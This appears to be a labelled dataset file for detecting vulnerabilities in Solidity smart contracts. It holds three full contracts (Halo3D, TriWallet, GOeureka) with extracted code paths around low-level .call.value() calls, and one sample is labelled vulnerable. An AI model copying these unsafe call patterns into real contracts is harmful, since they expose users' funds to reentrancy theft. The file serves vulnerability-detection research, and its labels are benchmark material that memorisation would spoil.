{"sol name": "14284.sol", "label": 0, "first path": "function payCharity() payable public { uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved); require(ethToPay > 1); totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay); if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) { totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay); ", "second path": "function payCharity() payable public { uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved); require(ethToPay > 1); totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay); if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) { totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay); ", "third path": "function payCharity() payable public { uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved); require(ethToPay > 1); totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay); if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) { totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay); ", "long path": "pragma solidity ^0.4.21; contract AcceptsHalo3D { Halo3D public tokenContract; function AcceptsHalo3D(address _tokenContract) public { tokenContract = Halo3D(_tokenContract); } modifier onlyTokenContract { require(msg.sender == address(tokenContract)); _; } function tokenFallback(address _from, uint256 _value, bytes _data) external returns (bool); } contract Halo3D { modifier onlyBagholders() { require(myTokens() > 0); _; } modifier onlyStronghands() { require(myDividends(true) > 0); _; } modifier notContract() { require (msg.sender == tx.origin); _; } modifier onlyAdministrator(){ address _customerAddress = msg.sender; require(administrators[_customerAddress]); _; } modifier antiEarlyWhale(uint256 _amountOfEthereum){ address _customerAddress = msg.sender; if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){ require( ambassadors_[_customerAddress] == true && (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_ ); ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum); _; } else { onlyAmbassadors = false; _; } } event onTokenPurchase( address indexed customerAddress, uint256 incomingEthereum, uint256 tokensMinted, address indexed referredBy ); event onTokenSell( address indexed customerAddress, uint256 tokensBurned, uint256 ethereumEarned ); event onReinvestment( address indexed customerAddress, uint256 ethereumReinvested, uint256 tokensMinted ); event onWithdraw( address indexed customerAddress, uint256 ethereumWithdrawn ); event Transfer( address indexed from, address indexed to, uint256 tokens ); string public name = \"Halo3D\"; string public symbol = \"H3D\"; uint8 constant public decimals = 18; uint8 constant internal dividendFee_ = 20; uint8 constant internal charityFee_ = 2; uint256 constant internal tokenPriceInitial_ = 0.0000001 ether; uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether; uint256 constant internal magnitude = 2**64; address constant public giveEthCharityAddress = 0x5ADF43DD006c6C36506e2b2DFA352E60002d22Dc; uint256 public totalEthCharityRecieved; uint256 public totalEthCharityCollected; uint256 public stakingRequirement = 100e18; mapping(address => bool) internal ambassadors_; uint256 constant internal ambassadorMaxPurchase_ = 0.4 ether; uint256 constant internal ambassadorQuota_ = 10 ether; mapping(address => uint256) internal tokenBalanceLedger_; mapping(address => uint256) internal referralBalance_; mapping(address => int256) internal payoutsTo_; mapping(address => uint256) internal ambassadorAccumulatedQuota_; uint256 internal tokenSupply_ = 0; uint256 internal profitPerShare_; mapping(address => bool) public administrators; bool public onlyAmbassadors = true; mapping(address => bool) public canAcceptTokens_; function Halo3D() public { administrators[0xf4cFeD6A0f869548F73f05a364B329b86B6Bb157] = true; ambassadors_[0xf4cFeD6A0f869548F73f05a364B329b86B6Bb157] = true; ambassadors_[0xe436cbd3892c6dc3d6c8a3580153e6e0fa613cfc] = true; ambassadors_[0x922cFfa33A078B4Cc6077923e43447d8467F8B55] = true; ambassadors_[0x8Dd512843c24c382210a9CcC9C98B8b5eEED97e8] = true; ambassadors_[0x4ffe17a2a72bc7422cb176bc71c04ee6d87ce329] = true; ambassadors_[0x3747EaFE2Bc9cB5221879758ca24a0d15B47A9B6] = true; ambassadors_[0xB38094D492af4FfffF760707F36869713bFb2250] = true; ambassadors_[0xBa21d01125D6932ce8ABf3625977899Fd2C7fa30] = true; ambassadors_[0x2e6236591bfa37c683ce60d6cfde40396a114ff1] = true; ambassadors_[0xa683C1b815997a7Fa38f6178c84675FC4c79AC2B] = true; ambassadors_[0x84ECB387395a1be65E133c75Ff9e5FCC6F756DB3] = true; ambassadors_[0x05f2c11996d73288AbE8a31d8b593a693FF2E5D8] = true; ambassadors_[0x5632CA98e5788edDB2397757Aa82d1Ed6171e5aD] = true; ambassadors_[0xA790fa6422A15a3637885f6811e5428de3513169] = true; ambassadors_[0x008ca4F1bA79D1A265617c6206d7884ee8108a78] = true; ambassadors_[0x7c377B7bCe53a5CEF88458b2cBBe11C3babe16DA] = true; ambassadors_[0x183feBd8828a9ac6c70C0e27FbF441b93004fC05] = true; ambassadors_[0x29A9c76aD091c015C12081A1B201c3ea56884579] = true; } function buy(address _referredBy) public payable returns(uint256) { purchaseInternal(msg.value, _referredBy); } function() payable public { purchaseInternal(msg.value, 0x0); } function payCharity() payable public { uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved); require(ethToPay > 1); totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay); if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) { totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay); } } function reinvest() onlyStronghands() public { uint256 _dividends = myDividends(false); address _customerAddress = msg.sender; payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude); _dividends += referralBalance_[_customerAddress]; referralBalance_[_customerAddress] = 0; uint256 _tokens = purchaseTokens(_dividends, 0x0); onReinvestment(_customerAddress, _dividends, _tokens); } function exit() public { address _customerAddress = msg.sender; uint256 _tokens = tokenBalanceLedger_[_customerAddress]; if(_tokens > 0) sell(_tokens); withdraw(); } function withdraw() onlyStronghands() public { address _customerAddress = msg.sender; uint256 _dividends = myDividends(false); payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude); _dividends += referralBalance_[_customerAddress]; referralBalance_[_customerAddress] = 0; _customerAddress.transfer(_dividends); onWithdraw(_customerAddress, _dividends); } function sell(uint256 _amountOfTokens) onlyBagholders() public { address _customerAddress = msg.sender; require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]); uint256 _tokens = _amountOfTokens; uint256 _ethereum = tokensToEthereum_(_tokens); uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_ethereum, charityFee_), 100); uint256 _taxedEthereum =  SafeMath.sub(SafeMath.sub(_ethereum, _dividends), _charityPayout); totalEthCharityCollected = SafeMath.add(totalEthCharityCollected, _charityPayout); tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens); tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens); int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude)); payoutsTo_[_customerAddress] -= _updatedPayouts; if (tokenSupply_ > 0) { profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_); } onTokenSell(_customerAddress, _tokens, _taxedEthereum); } function transfer(address _toAddress, uint256 _amountOfTokens) onlyBagholders() public returns(bool) { address _customerAddress = msg.sender; require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]); if(myDividends(true) > 0) withdraw(); tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens); tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens); payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens); payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens); Transfer(_customerAddress, _toAddress, _amountOfTokens); return true; } function transferAndCall(address _to, uint256 _value, bytes _data) external returns (bool) { require(_to != address(0)); require(canAcceptTokens_[_to] == true); require(transfer(_to, _value)); if (isContract(_to)) { AcceptsHalo3D receiver = AcceptsHalo3D(_to); require(receiver.tokenFallback(msg.sender, _value, _data)); } return true; } function isContract(address _addr) private constant returns (bool is_contract) { uint length; assembly { length := extcodesize(_addr) } return length > 0; } function disableInitialStage() onlyAdministrator() public { onlyAmbassadors = false; } function setAdministrator(address _identifier, bool _status) onlyAdministrator() public { administrators[_identifier] = _status; } function setStakingRequirement(uint256 _amountOfTokens) onlyAdministrator() public { stakingRequirement = _amountOfTokens; } function setCanAcceptTokens(address _address, bool _value) onlyAdministrator() public { canAcceptTokens_[_address] = _value; } function setName(string _name) onlyAdministrator() public { name = _name; } function setSymbol(string _symbol) onlyAdministrator() public { symbol = _symbol; } function totalEthereumBalance() public view returns(uint) { return this.balance; } function totalSupply() public view returns(uint256) { return tokenSupply_; } function myTokens() public view returns(uint256) { address _customerAddress = msg.sender; return balanceOf(_customerAddress); } function myDividends(bool _includeReferralBonus) public view returns(uint256) { address _customerAddress = msg.sender; return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ; } function balanceOf(address _customerAddress) view public returns(uint256) { return tokenBalanceLedger_[_customerAddress]; } function dividendsOf(address _customerAddress) view public returns(uint256) { return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude; } function sellPrice() public view returns(uint256) { if(tokenSupply_ == 0){ return tokenPriceInitial_ - tokenPriceIncremental_; } else { uint256 _ethereum = tokensToEthereum_(1e18); uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_ethereum, charityFee_), 100); uint256 _taxedEthereum = SafeMath.sub(SafeMath.sub(_ethereum, _dividends), _charityPayout); return _taxedEthereum; } } function buyPrice() public view returns(uint256) { if(tokenSupply_ == 0){ return tokenPriceInitial_ + tokenPriceIncremental_; } else { uint256 _ethereum = tokensToEthereum_(1e18); uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_ethereum, charityFee_), 100); uint256 _taxedEthereum =  SafeMath.add(SafeMath.add(_ethereum, _dividends), _charityPayout); return _taxedEthereum; } } function calculateTokensReceived(uint256 _ethereumToSpend) public view returns(uint256) { uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereumToSpend, dividendFee_), 100); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_ethereumToSpend, charityFee_), 100); uint256 _taxedEthereum = SafeMath.sub(SafeMath.sub(_ethereumToSpend, _dividends), _charityPayout); uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum); return _amountOfTokens; } function calculateEthereumReceived(uint256 _tokensToSell) public view returns(uint256) { require(_tokensToSell <= tokenSupply_); uint256 _ethereum = tokensToEthereum_(_tokensToSell); uint256 _dividends = SafeMath.div(SafeMath.mul(_ethereum, dividendFee_), 100); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_ethereum, charityFee_), 100); uint256 _taxedEthereum = SafeMath.sub(SafeMath.sub(_ethereum, _dividends), _charityPayout); return _taxedEthereum; } function etherToSendCharity() public view returns(uint256) { return SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved); } function purchaseInternal(uint256 _incomingEthereum, address _referredBy) notContract() internal returns(uint256) { uint256 purchaseEthereum = _incomingEthereum; uint256 excess; if(purchaseEthereum > 5 ether) { if (SafeMath.sub(address(this).balance, purchaseEthereum) <= 100 ether) { purchaseEthereum = 5 ether; excess = SafeMath.sub(_incomingEthereum, purchaseEthereum); } } purchaseTokens(purchaseEthereum, _referredBy); if (excess > 0) { msg.sender.transfer(excess); } } function purchaseTokens(uint256 _incomingEthereum, address _referredBy) antiEarlyWhale(_incomingEthereum) internal returns(uint256) { uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingEthereum, dividendFee_), 100); uint256 _referralBonus = SafeMath.div(_undividedDividends, 3); uint256 _charityPayout = SafeMath.div(SafeMath.mul(_incomingEthereum, charityFee_), 100); uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus); uint256 _taxedEthereum = SafeMath.sub(SafeMath.sub(_incomingEthereum, _undividedDividends), _charityPayout); totalEthCharityCollected = SafeMath.add(totalEthCharityCollected, _charityPayout); uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum); uint256 _fee = _dividends * magnitude; require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_)); if( _referredBy != 0x0000000000000000000000000000000000000000 && _referredBy != msg.sender && tokenBalanceLedger_[_referredBy] >= stakingRequirement ){ referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus); } else { _dividends = SafeMath.add(_dividends, _referralBonus); _fee = _dividends * magnitude; } if(tokenSupply_ > 0){ tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens); profitPerShare_ += (_dividends * magnitude / (tokenSupply_)); _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_)))); } else { tokenSupply_ = _amountOfTokens; } tokenBalanceLedger_[msg.sender] = SafeMath.add(tokenBalanceLedger_[msg.sender], _amountOfTokens); int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee); payoutsTo_[msg.sender] += _updatedPayouts; onTokenPurchase(msg.sender, _incomingEthereum, _amountOfTokens, _referredBy); return _amountOfTokens; } function ethereumToTokens_(uint256 _ethereum) internal view returns(uint256) { uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18; uint256 _tokensReceived = ( ( SafeMath.sub( (sqrt ( (_tokenPriceInitial**2) + (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18)) + (((tokenPriceIncremental_)**2)*(tokenSupply_**2)) + (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_) ) ), _tokenPriceInitial ) )/(tokenPriceIncremental_) )-(tokenSupply_) ; return _tokensReceived; } function tokensToEthereum_(uint256 _tokens) internal view returns(uint256) { uint256 tokens_ = (_tokens + 1e18); uint256 _tokenSupply = (tokenSupply_ + 1e18); uint256 _etherReceived = ( SafeMath.sub( ( ( ( tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18)) )-tokenPriceIncremental_ )*(tokens_ - 1e18) ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2 ) /1e18); return _etherReceived; } function sqrt(uint x) internal pure returns (uint y) { uint z = (x + 1) / 2; y = x; while (z < y) { y = z; z = (x / z + z) / 2; } } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } "}
{"sol name": "40366.sol", "label": 0, "first path": "function execute(address _to, uint _value, bytes _data) { if (!isRightBranch) throw; if (msg.sender != owner) throw; if (!_to.call.value (_value)(_data)) throw; contract BranchSender { bool public isRightBranch; ", "second path": "function execute(address _to, uint _value, bytes _data) { if (!isRightBranch) throw; if (msg.sender != owner) throw; if (!_to.call.value (_value)(_data)) throw; contract BranchSender { bool public isRightBranch; ", "third path": "function execute(address _to, uint _value, bytes _data) { if (!isRightBranch) throw; if (msg.sender != owner) throw; if (!_to.call.value (_value)(_data)) throw; contract BranchSender { bool public isRightBranch; ", "long path": "contract TriWallet { bool public thisIsFork; address public etcWallet; address public ethWallet; event ETCWalletCreated(address etcWalletAddress); event ETHWalletCreated(address ethWalletAddress); function TriWallet () { thisIsFork = BranchSender (0x23141df767233776f7cbbec497800ddedaa4c684).isRightBranch (); etcWallet = new BranchWallet (msg.sender, !thisIsFork); ethWallet = new BranchWallet (msg.sender, thisIsFork); ETCWalletCreated (etcWallet); ETHWalletCreated (ethWallet); } function distribute () { if (thisIsFork) { if (!ethWallet.send (this.balance)) throw; } else { if (!etcWallet.send (this.balance)) throw; } } } contract BranchWallet { address public owner; bool public isRightBranch; function BranchWallet (address _owner, bool _isRightBranch) { owner = _owner; isRightBranch = _isRightBranch; } function () { if (!isRightBranch) throw; } function send (address _to, uint _value) { if (!isRightBranch) throw; if (msg.sender != owner) throw; if (!_to.send (_value)) throw; } function execute(address _to, uint _value, bytes _data) { if (!isRightBranch) throw; if (msg.sender != owner) throw; if (!_to.call.value (_value)(_data)) throw; } } contract BranchSender { bool public isRightBranch; } "}
{"sol name": "2189.sol", "label": 1, "first path": "function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable { using SafeMath for uint256; GOeureka public token; WhiteListedBasic public whiteListed; uint256 public presaleEnd; uint256 public saleEnd; uint256 public minContribution; address public multiSig; uint256 public weiRaised; uint256 public tokensRaised; mapping(address => uint256) public contributions; uint256 public numberOfContributors = 0; uint public basicRate; event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount); event SaleClosed(); event HardcapReached(); event NewCapActivated(uint256 newCap); constructor(GOeureka token_, WhiteListedBasic _whiteListed) public { basicRate = 3000; calculateRates(); presaleEnd = 1536508800; saleEnd = 1543593600; multiSig = MULTISIG_ETH; token = token_; whiteListed = _whiteListed; bool allocated = false; ", "second path": "function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable { using SafeMath for uint256; GOeureka public token; WhiteListedBasic public whiteListed; uint256 public presaleEnd; uint256 public saleEnd; uint256 public minContribution; address public multiSig; uint256 public weiRaised; uint256 public tokensRaised; mapping(address => uint256) public contributions; uint256 public numberOfContributors = 0; uint public basicRate; event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount); event SaleClosed(); event HardcapReached(); event NewCapActivated(uint256 newCap); constructor(GOeureka token_, WhiteListedBasic _whiteListed) public { basicRate = 3000; calculateRates(); presaleEnd = 1536508800; saleEnd = 1543593600; multiSig = MULTISIG_ETH; token = token_; whiteListed = _whiteListed; bool allocated = false; ", "third path": "function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable { using SafeMath for uint256; GOeureka public token; WhiteListedBasic public whiteListed; uint256 public presaleEnd; uint256 public saleEnd; uint256 public minContribution; address public multiSig; uint256 public weiRaised; uint256 public tokensRaised; mapping(address => uint256) public contributions; uint256 public numberOfContributors = 0; uint public basicRate; event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount); event SaleClosed(); event HardcapReached(); event NewCapActivated(uint256 newCap); constructor(GOeureka token_, WhiteListedBasic _whiteListed) public { basicRate = 3000; calculateRates(); presaleEnd = 1536508800; saleEnd = 1543593600; multiSig = MULTISIG_ETH; token = token_; whiteListed = _whiteListed; bool allocated = false; ", "long path": "pragma solidity ^0.4.23; contract GoConfig { string public constant NAME = \"GOeureka\"; string public constant SYMBOL = \"GOT\"; uint8 public constant DECIMALS = 18; uint public constant DECIMALSFACTOR = 10 ** uint(DECIMALS); uint public constant TOTALSUPPLY = 1000000000 * DECIMALSFACTOR; } contract Ownable { address public owner; event OwnershipRenounced(address indexed previousOwner); event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } function renounceOwnership() public onlyOwner { emit OwnershipRenounced(owner); owner = address(0); } } contract WhiteListedBasic { function addWhiteListed(address[] addrs) external; function removeWhiteListed(address addr) external; function isWhiteListed(address addr) external view returns (bool); } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract OperatableBasic { function setMinter (address addr) external; function setWhiteLister (address addr) external; } contract gotTokenSaleConfig is GoConfig { uint public constant MIN_PRESALE = 5 ether; uint public constant MIN_PRESALE2 = 1 ether; uint public constant VESTING_AMOUNT = 100000000 * DECIMALSFACTOR; address public constant VESTING_WALLET = 0x8B6EB396eF85D2a9ADbb79955dEB5d77Ee61Af88; uint public constant RESERVE_AMOUNT = 300000000 * DECIMALSFACTOR; address public constant RESERVE_WALLET = 0x8B6EB396eF85D2a9ADbb79955dEB5d77Ee61Af88; uint public constant PRESALE_START = 1529035246; uint public constant SALE_START = PRESALE_START + 4 weeks; uint public constant SALE_CAP = 600000000 * DECIMALSFACTOR; address public constant MULTISIG_ETH = RESERVE_WALLET; } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; emit Pause(); } function unpause() onlyOwner whenPaused public { paused = false; emit Unpause(); } } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } } contract Claimable is Ownable { address public pendingOwner; modifier onlyPendingOwner() { require(msg.sender == pendingOwner); _; } function transferOwnership(address newOwner) onlyOwner public { pendingOwner = newOwner; } function claimOwnership() onlyPendingOwner public { emit OwnershipTransferred(owner, pendingOwner); owner = pendingOwner; pendingOwner = address(0); } } contract Operatable is Claimable, OperatableBasic { address public minter; address public whiteLister; address public launcher; event NewMinter(address newMinter); event NewWhiteLister(address newwhiteLister); modifier canOperate() { require(msg.sender == minter || msg.sender == whiteLister || msg.sender == owner); _; } constructor() public { minter = owner; whiteLister = owner; launcher = owner; } function setMinter (address addr) external onlyOwner { minter = addr; emit NewMinter(minter); } function setWhiteLister (address addr) external onlyOwner { whiteLister = addr; emit NewWhiteLister(whiteLister); } modifier ownerOrMinter()  { require ((msg.sender == minter) || (msg.sender == owner)); _; } modifier onlyLauncher()  { require (msg.sender == launcher); _; } modifier onlyWhiteLister()  { require (msg.sender == whiteLister); _; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract BurnableToken is BasicToken { event Burn(address indexed burner, uint256 value); function burn(uint256 _value) public { _burn(msg.sender, _value); } function _burn(address _who, uint256 _value) internal { require(_value <= balances[_who]); balances[_who] = balances[_who].sub(_value); totalSupply_ = totalSupply_.sub(_value); emit Burn(_who, _value); emit Transfer(_who, address(0), _value); } } contract Salvageable is Operatable { function emergencyERC20Drain(ERC20 oddToken, uint amount) public onlyLauncher { if (address(oddToken) == address(0)) { launcher.transfer(amount); return; } oddToken.transfer(launcher, amount); } } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom( address _from, address _to, uint256 _value ) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance( address _owner, address _spender ) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval( address _spender, uint _addedValue ) public returns (bool) { allowed[msg.sender][_spender] = ( allowed[msg.sender][_spender].add(_addedValue)); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval( address _spender, uint _subtractedValue ) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract PausableToken is StandardToken, Pausable { function transfer( address _to, uint256 _value ) public whenNotPaused returns (bool) { return super.transfer(_to, _value); } function transferFrom( address _from, address _to, uint256 _value ) public whenNotPaused returns (bool) { return super.transferFrom(_from, _to, _value); } function approve( address _spender, uint256 _value ) public whenNotPaused returns (bool) { return super.approve(_spender, _value); } function increaseApproval( address _spender, uint _addedValue ) public whenNotPaused returns (bool success) { return super.increaseApproval(_spender, _addedValue); } function decreaseApproval( address _spender, uint _subtractedValue ) public whenNotPaused returns (bool success) { return super.decreaseApproval(_spender, _subtractedValue); } } contract GOeureka is  Salvageable, PausableToken, BurnableToken, GoConfig { using SafeMath for uint; string public name = NAME; string public symbol = SYMBOL; uint8 public decimals = DECIMALS; bool public mintingFinished = false; event Mint(address indexed to, uint amount); event MintFinished(); modifier canMint() { require(!mintingFinished); _; } constructor() public { paused = true; } function mint(address _to, uint _amount) ownerOrMinter canMint public returns (bool) { require(totalSupply_.add(_amount) <= TOTALSUPPLY); totalSupply_ = totalSupply_.add(_amount); balances[_to] = balances[_to].add(_amount); emit Mint(_to, _amount); emit Transfer(address(0), _to, _amount); return true; } function finishMinting() ownerOrMinter canMint public returns (bool) { mintingFinished = true; emit MintFinished(); return true; } function sendBatchCS(address[] _recipients, uint[] _values) external ownerOrMinter returns (bool) { require(_recipients.length == _values.length); uint senderBalance = balances[msg.sender]; for (uint i = 0; i < _values.length; i++) { uint value = _values[i]; address to = _recipients[i]; require(senderBalance >= value); senderBalance = senderBalance - value; balances[to] += value; emit Transfer(msg.sender, to, value); } balances[msg.sender] = senderBalance; return true; } function transferAndCall( address _to,  uint256 _value,   bytes _data) public payable whenNotPaused returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; } } contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable { using SafeMath for uint256; GOeureka public token; WhiteListedBasic public whiteListed; uint256 public presaleEnd; uint256 public saleEnd; uint256 public minContribution; address public multiSig; uint256 public weiRaised; uint256 public tokensRaised; mapping(address => uint256) public contributions; uint256 public numberOfContributors = 0; uint public basicRate; event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount); event SaleClosed(); event HardcapReached(); event NewCapActivated(uint256 newCap); constructor(GOeureka token_, WhiteListedBasic _whiteListed) public { basicRate = 3000; calculateRates(); presaleEnd = 1536508800; saleEnd = 1543593600; multiSig = MULTISIG_ETH; token = token_; whiteListed = _whiteListed; } bool allocated = false; function mintAllocations() external onlyOwner { require(!allocated); allocated = true; token.mint(VESTING_WALLET,VESTING_AMOUNT); token.mint(RESERVE_WALLET,RESERVE_AMOUNT); } function setWallet(address _newWallet) public onlyOwner { multiSig = _newWallet; } function hasEnded() public view returns (bool) { if (now > saleEnd) return true; if (tokensRaised >= SALE_CAP) return true; return false; } function isWhiteListed(address beneficiary) internal view returns (bool) { return whiteListed.isWhiteListed(beneficiary); } modifier onlyAuthorised(address beneficiary) { require(isWhiteListed(beneficiary),\"Not authorised\"); require (!hasEnded(),\"ended\"); require (multiSig != 0x0,\"MultiSig empty\"); require ((msg.value > minContribution) || (tokensRaised.add(getTokens(msg.value)) == SALE_CAP),\"Value too small\"); _; } function setNewRate(uint newRate) onlyOwner public { require(weiRaised == 0); require(1000 < newRate && newRate < 10000); basicRate = newRate; calculateRates(); } function calculateRates() internal { minContribution = uint(100 * DECIMALSFACTOR).div(basicRate); } function getTokens(uint256 amountInWei) internal view returns (uint256 tokens) { if (now <= presaleEnd) { uint theseTokens = amountInWei.mul(basicRate).mul(1125).div(1000); require((amountInWei >= 1 ether) || (tokensRaised.add(theseTokens)==SALE_CAP)); return (theseTokens); } if (now <= saleEnd) { return (amountInWei.mul(basicRate)); } revert(); } function buyTokens(address beneficiary, uint256 value) internal onlyAuthorised(beneficiary) whenNotPaused { uint256 newTokens; newTokens = getTokens(value); weiRaised = weiRaised.add(value); if (contributions[beneficiary] == 0) { numberOfContributors++; } contributions[beneficiary] = contributions[beneficiary].add(value); tokensRaised = tokensRaised.add(newTokens); token.mint(beneficiary,newTokens); emit TokenPurchase(beneficiary, value, newTokens); multiSig.transfer(value); } function placeTokens(address beneficiary, uint256 tokens) public onlyOwner { require(!hasEnded()); tokensRaised = tokensRaised.add(tokens); token.mint(beneficiary,tokens); } function finishSale() public onlyOwner { require(hasEnded()); token.finishMinting(); emit SaleClosed(); } function () public payable { buyTokens(msg.sender, msg.value); } } "}
